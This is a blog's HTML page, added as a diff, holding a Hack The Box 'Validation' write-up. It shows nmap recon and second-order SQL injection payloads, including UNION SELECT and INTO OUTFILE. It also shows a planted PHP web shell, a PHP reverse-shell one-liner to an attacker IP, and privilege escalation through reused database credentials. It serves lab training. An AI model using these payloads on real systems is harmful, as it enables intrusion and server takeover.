@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GTPQRVRV1B"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'G-GTPQRVRV1B');
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <link rel="icon" href="/favicon.png" />
+    <title>
+        Hack the box: Validation Writeup | Easy Box
+    </title>
+    <!-- Spectre.css framework -->
+    <!-- <link rel="stylesheet" href="/css/spectre/spectre.min.css">
+  <link rel="stylesheet" href="/css/spectre/spectre-exp.min.css">
+  <link rel="stylesheet" href="/css/spectre/spectre-icons.min.css"> -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    <link rel="stylesheet" href="/css/book.css">
+    <script src="/js/book.js"></script>
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css">
+</head>
+
+<body>
+    <div id="navbar" class="#">
+        <div class="card topnav">
+            <div class="book-navbar">
+                <header class="navbar">
+                    <section class="navbar-section">
+                        <a onclick="open_sidebar()">
+                            <i class="icon icon-menu"></i>
+                        </a>
+                    </section>
+                </header>
+            </div>
+        </div>
+    </div>
+
+    <div class="book-container">
+
+        <!-- left side bar -->
+        <div class="book-sidebar">
+            <div class="container">
+                <div class="columns">
+                    <div class="column col-5 side-blank"></div>
+                    <div class="column col-7">
+                        <div class="book-brand">
+                            <a href="/">
+                                <h3>Infosec Blog</h3>
+                            </a>
+                        </div>
+                        <!-- side nav -->
+                        <div class="book-menu">
+                            <ul>
+                                <li><a href="/">Home</a></li>
+                            </ul>
+                            <h2 id="Categories">
+                                <a href="#" class="headerlink" title="Categories"></a>
+                                Categories
+                            </h2>
+                            <h2 id="Hack-The-Box-Write-ups">
+                                <a href="#" class="headerlink" title="Hack The Box Write-ups"></a>
+                                HTB Write-ups
+                            </h2>
+                            <ul>
+                                <li><a href="/htb/Validation/Validation.html">Validation</a></li>
+                                <!-- <li><a href="/htb/two.html">Two</a></li> -->
+                                <!-- <li><a href="#">Three</a></li> -->
+                            </ul>
+                            <h2 id="Wizard-Labs-Write-ups">
+                                <a href="#" class="headerlink" title="Wizard Labs Write-ups"></a>
+                                HTB Active Boxes
+                            </h2>
+                            <ul>
+                                <li><a href="/activebox/Previse/Previse.html">Previse w/o Metasploit</a></li>
+                                <!-- <li><a href="/activebox/Two/two.html">Two</a></li> -->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <script src="/js/book-menu.js"></script>
+        </div>
+
+        <div class="off-canvas-content">
+            <div class="columns">
+                <div class="column col-8 col-lg-12">
+                    <div class="book-content">
+                        <div class="book-post">
+
+                            <!-- Content -->
+
+                            <h1 id="heading">Hack The Box: Validation Writeup</h1>
+                            <figure>
+                                <img class="img-responsive" style="margin-bottom: 0px;"
+                                    src="/htb/Validation/Validation.webp" alt="Hack the box validation">
+                                <figcaption class="figure-caption text-center">HTB: Validation | Easy Linux Box
+                                </figcaption>
+                            </figure>
+                            <h2 id="recon">Reconnaissance</h2>
+                            <p>First, we run nmap scan to check for open ports and the service running on them.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">nmap -sC -sV -A 10.10.11.116
+
+Not shown: 991 closed ports
+PORT     STATE    SERVICE       VERSION
+22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
+|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
+|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
+80/tcp   open     http          Apache httpd 2.4.48 ((Debian))
+|_http-server-header: Apache/2.4.48 (Debian)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+513/tcp  filtered login
+5000/tcp filtered upnp
+5001/tcp filtered commplex-link
+5002/tcp filtered rfe
+5003/tcp filtered filemaker
+5004/tcp filtered avt-profile-1
+8080/tcp open     http          nginx
+|_http-title: 502 Bad Gateway
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
+                                </div>
+                            </div>
+                            <ul>
+                                <li>
+                                    <p><b>-sC :</b> default script scanning</p>
+                                </li>
+                                <li>
+                                    <p><b>-sV :</b> service version scanning</p>
+                                </li>
+                                <li>
+                                    <p><b>-A :</b> aggressive scanning</p>
+                                </li>
+                            </ul>
+                            <p>We see 3 ports are open:</p>
+                            <ul>
+                                <li>
+                                    <p><b>Port 22 :</b> ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3</p>
+                                </li>
+                                <li>
+                                    <p><b>Port 80 :</b> http Apache httpd 2.4.48</p>
+                                </li>
+                                <li>
+                                    <p><b>Port 8080 :</b> Bad Gateway</p>
+                                </li>
+                            </ul>
+                            <p>Nothing interseting comes up hunting for CVE for the service versions running.</p>
+                            <p>Let's dig into the website on port 80.</p>
+                            <h2 id="enum">Enumeration</h2>
+                            <p>Landing Page</p>
+                            <img src="/htb/Validation/1.png" alt="landing page of website">
+                            <p>Got redirected to another page which is supposed to have logs of other people.</p>
+                            <img src="/htb/Validation/2.png" alt="Logs page for brazil">
+                            <p>Let's try for SQL injection here.</p>
+                            <p>Maybe we can get some interesting info from the database.</p>
+                            <img src="/htb/Validation/3.png" alt="first SQL attempt">
+                            <p>Looks like a failed SQL injection, whole of the query statement got taken in as the input
+                                i.e. nothing escaped the input field.</p>
+                            <img src="/htb/Validation/4.png" alt="Burp request">
+                            <p>Intersepting the POST request in buptsuit we can see the "country" input we can meddle
+                                with with SQL injection.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">username=utkc&country=Brazil' or 1=1 #
+</pre>
+                                </div>
+                            </div>
+                            <img src="/htb/Validation/5.png" alt="tried for SQL injection in country input">
+                            <p>It's a hit, it seems to be a second order SQL injection as the input is being stored and
+                                still not being properly parsed when being used.</p>
+                            <p>But the injected query failed for some reason.</p>
+                            <p>Trying the same query again with a diffrent username and country made it work.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">username=utkc1&country=Albania' or 1=1 #
+</pre>
+                                </div>
+                            </div>
+                            <img src="/htb/Validation/6.png" alt="Second try with diffrent username and country">
+                            <p>Let's try some UNION based SQL queries.</p>
+                            <p>First let's determine the number of columns</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">username=utkc1&country=Albania' ORDER BY 1 #
+</pre>
+                                </div>
+                            </div>
+                            <p>We increment the number until we get an error message.</p>
+                            <img src="/htb/Validation/7.png" alt="error message in order by query">
+                            <p>Got this error message for ORDER BY 2, it seems to have just one coulmn.</p>
+                            <p>Now let's get the database name, version and user.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">username=utkc2&country=Algeria' UNION SELECT database() #
+    registration
+username=utkc2&country=Algeria' UNION SELECT version() #
+    10.5.11-MariaDB-1
+username=utkc2&country=Algeria' UNION SELECT user() #
+    uhc@localhost</pre>
+                                </div>
+                            </div>
+                            <p>I dug in a bit futher enumerating the database but didn't find anything intresting.</p>
+                            <h2 id="user">Gaining an Initial Foothold</h2>
+                            <p>Lets try uploading file to the server with SQL injection.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre
+                                        class="code-p">username=utkc2&country=Algeria' UNION SELECT "hello" into outfile '/var/www/html/hello.txt' #</pre>
+                                </div>
+                            </div>
+                            <img src="/htb/Validation/8.png" alt="making a twst file with SQL injection query">
+                            <p>This gave an error but it still worked when I checked the URL.</p>
+                            <img src="/htb/Validation/9.png" alt="test injected website">
+                            <p>Let's put a backdoor php code in the file.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <!-- change the special chars -->
+                                    <pre
+                                        class="code-p">country=Algeria' UNION SELECT '&lt;?php system($_GET["cmd"]) ?>' into outfile '/var/www/html/cmd.php' #</pre>
+                                </div>
+                            </div>
+                            <img src="/htb/Validation/10.png" alt="backdoor">
+                            <p>It worked!</p>
+                            <p>Let's get a reverse shell now.</p>
+                            <img src="/htb/Validation/11.png" alt="not netcat">
+                            <p>The machine dosen't have netcat.</p>
+                            <p>We can got to <a
+                                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings</a>
+                                and try some reverse shells.</p>
+                            <p>Since it's a php website we can try a php reverse shell.</p>
+                            <p>Let's also set up a netcat listner on our machine</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <!-- change the special chars -->
+                                    <pre
+                                        class="code-p">nc -lnvp 4444
+
+?cmd=php -r '$sock=fsockopen("10.10.14.20",4444);exec("/bin/sh -i &lt;&3 >&3 2>&3");'</pre>
+                                </div>
+                            </div>
+                            <!-- <blockquote>
+                                <p>Don't forget to URL encode the reverse shell code when entering it into the browser.</p>
+                            </blockquote> -->
+                            <img src="/htb/Validation/12.png" alt="reverse shell cought on netcat">
+                            <p>And we got ourselves a revershe shell.</p>
+                            <p>Let's get the user flag</p>
+                            <img src="/htb/Validation/13.png" alt="user flag">
+                            <h2 id="root">Privilege Escalation</h2>
+                            <p>Getting the root flag on this machine was pretty easy.</p>
+                            <p>There was no need much enumeration, the credentials file was right where we landed when we got the shell!</p>
+                            <p>Let's got to the <code>html</code> directory and look into <code>config.php</code> file.</p>
+                            <img src="/htb/Validation/14.png" alt="config file exploration">
+                            <p>Here we have credentails to connect to sql server for user <code>uhc</code></p>
+                            <p>Let's try to use these credentials to access root user.</p>
+                            <img src="/htb/Validation/15.png" alt="root flag">
+                            <p>It worked!</p>
+                            <p>We got the root flag.</p>
+                            <!-- content end -->
+
+                        </div>
+                        <br>
+                        <!-- pagination -->
+                        <div class="columns col-oneline col-gapless pagination">
+                            <div class="column col-6 pag">
+                                <a href="/index.html">
+                                    <div class="card card-2">
+                                        <div class="columns">
+                                            <div class="column col-1"><i class="icon icon-back"></i></div>
+                                            <div class="column col-11 text-right">About Me</div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </div>
+                            <div class="column col-6 pag">
+                                <a href="/activebox/Previse/Previse.html">
+                                    <div class="card card-2">
+                                        <div class="columns">
+                                            <div class="column col-11">Previse</div>
+                                            <div class="column col-1 text-right"><i class="icon icon-forward"></i></div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </div>
+                        </div>
+
+                        <div class="book-comments"></div>
+                    </div>
+                </div>
+                <!-- rsidebar -->
+                <div class="column col-4 hide-lg col-mx-auto">
+                    <div class="book-post-info">
+                        <div class="book-post-meta">
+                            <div class="author">
+                                <!-- Author image -->
+                                <div class="author-img">
+                                    <figure class="avatar avatar-lg">
+                                        <img src="/pp.webp" alt="...">
+                                    </figure>
+                                </div>
+                                <!-- Author title -->
+                                <div class="author-title">
+                                    <div>peace_fool</div>
+                                </div>
+                            </div>
+                            <div class="divider"></div>
+                            <div class="link">
+                                <h6>Content</h6>
+                            </div>
+                            <div class="divider"></div>
+                        </div>
+                        <div class="book-tocbot"></div>
+                        <div class="book-tocbot-menu">
+                            <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+                            <a onclick="go_top()"><i class="icon icon-upward"></i>&#160;&#160;Back to top</a>
+                            <a onclick="go_bottom()"><i class="icon icon-downward"></i>&#160;&#160;Go to bottom</a>
+                        </div>
+                        <script src="/js/book-toc.js"></script>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+        <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+    </div>
+
+    <script src="/js/book.js"></script>
+</body>
+
+</html>
